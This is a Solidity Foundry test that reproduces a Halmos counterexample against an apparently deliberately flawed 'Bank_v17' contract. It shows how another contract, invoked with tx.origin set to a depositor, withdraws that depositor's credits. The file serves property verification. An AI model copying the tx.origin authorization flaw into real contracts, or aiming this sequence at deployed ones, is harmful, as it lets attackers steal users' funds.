// SPDX-License-Identifier: UNLICENSED
pragma solidity >=0.8.2;

import {Test} from "forge-std/Test.sol";
import {Bank} from "versions/Bank_v17.sol";

// Contract user (userContract1 = 0xaaaa0005 in the counterexample).
// receive_choice = 0 => accepts ETH and does nothing.
contract User {
    receive() external payable {}
}

// Halmos counterexample (log: v17_credit-dec-onlyif-withdraw.log):
//   halmos_A_address = 0x8000000000000000000000000000000000000000
//   tx1: sender = EOA 0x8000...0000, tx.origin = 0x8000...0000
//        deposit()                 p_value  = 0x100000000000000000000000000000000
//   tx2: sender = userContract1 (sender_is_contract = 1, sender_is_contract0 = 0),
//        tx.origin = 0x8000...0000
//        withdraw(p_amount)        p_amount = 0x100000000000000000000000000000000, p_value = 0
//        receive_choice = 0
// The bug: `withdraw` subtracts credits from tx.origin (= A), but the sender is userContract1.
// This is the same scenario as forge/test/credit-dec-onlyif-withdraw_v17.t.sol
// (there an intermediate contract Attack calls withdraw with tx.origin = A).
contract PoC_CreditDecOnlyifWithdraw_v17 is Test {

    Bank bank;
    User user;
    address constant A = 0x8000000000000000000000000000000000000000;

    function setUp() public {
        bank = new Bank();
        user = new User();
    }

    function _credits(address who) internal view returns (uint256) {
        return uint256(vm.load(address(bank), keccak256(abi.encode(who, uint256(0)))));
    }

    function test_poc_credit_dec_onlyif_withdraw() public {
        uint256 value = 0x100000000000000000000000000000000;

        // tx1: A (EOA) deposits
        vm.deal(A, value);
        vm.prank(A, A);
        bank.deposit{value: value}();

        uint256 creditBefore = _credits(A);

        // tx2: userContract1 calls withdraw, with tx.origin = A
        vm.prank(address(user), A);
        bank.withdraw(0x100000000000000000000000000000000);

        uint256 creditAfter = _credits(A);

        // property: if A's credit decreased, the tx must be a `withdraw` whose sender is A.
        // Here the tx is a `withdraw`, but the sender is userContract1, not A.
        assertNotEq(address(user), A);
        assertLt(creditAfter, creditBefore, "credit-dec-onlyif-withdraw holds: counterexample not reproduced");
    }
}
